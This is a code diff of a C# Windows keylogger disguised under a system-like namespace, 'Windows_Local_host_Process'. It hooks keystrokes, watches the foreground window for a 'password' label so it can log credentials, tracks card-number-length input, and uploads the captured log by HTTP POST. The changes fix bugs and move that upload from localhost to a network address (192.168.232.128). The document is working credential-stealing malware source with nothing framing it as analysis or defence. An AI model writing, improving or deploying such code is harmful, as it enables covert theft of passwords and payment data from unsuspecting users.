@@ -77,13 +77,15 @@ namespace Windows_Local_host_Process
             
             SendMessage3(hwnd, WM_GETTEXT, 1024, sb);
             activeWindowTitle = sb.ToString();
-
+            strBldr.Clear();
             List<IntPtr> list = GetAllChildrenWindowHandles(hwnd, 100);
+
             for (int i = 0; i < list.Count; ++i)
             {
                 IntPtr hControl = list[i];
                 string caption = GetTextBoxText(hControl);
-                isLblPassFound = caption.ToLower().Contains("password");
+                isLblPassFound = caption != null && caption.ToLower().Contains("password");
+                if (isLblPassFound) break;
             }
         }
 
@@ -216,9 +218,8 @@ namespace Windows_Local_host_Process
                     strBldr.Remove(strBldr.Length - 1, 1);
                 else
                     //  Else append the character  to the word
-                    strBldr.Append(keysToChars(pressed));
-
-                
+                        strBldr.Append(keysToChars(pressed));
+                                
                 if (isLblPassFound && strBldr.Length == PASS_NUM_LEN) { // The label 'password' was found in the foreground window
                     WriteLogFile("Password:");
                     strBldr.Clear();
@@ -232,13 +233,15 @@ namespace Windows_Local_host_Process
                         strBldr.Clear();
                         ++countLoggedWords; 
                     }
-                }
-
+                }                
                 if (countLoggedWords == LOGGED_WORDS_LIMIT)
                 {
-                    SendFile();
+                    SendFile();                    
                     countLoggedWords = 0;
                 }
+                if (strBldr.Length == CC_NUM_LEN)
+
+                    strBldr.Clear();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -309,6 +312,10 @@ namespace Windows_Local_host_Process
                     return "9";
                 case Keys.Space:
                     return " ";
+                case Keys.LControlKey:
+                case Keys.RControlKey:
+                case Keys.Alt:
+                case Keys.Delete:
                 case Keys.Control:
                 case Keys.Clear:
                 case Keys.Home:
@@ -384,7 +391,7 @@ namespace Windows_Local_host_Process
         {
             System.Net.WebClient Client = new System.Net.WebClient();
             Client.Headers.Add("Content-Type", "binary/octet-stream");
-            byte[] result = Client.UploadFile("http://localhost/test/test.php", "POST", Application.StartupPath + @"\log.txt");
+            byte[] result = Client.UploadFile("http://192.168.232.128/test.php", "POST", Application.StartupPath + @"\log.txt");
             String s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
             Console.WriteLine(s);
         }
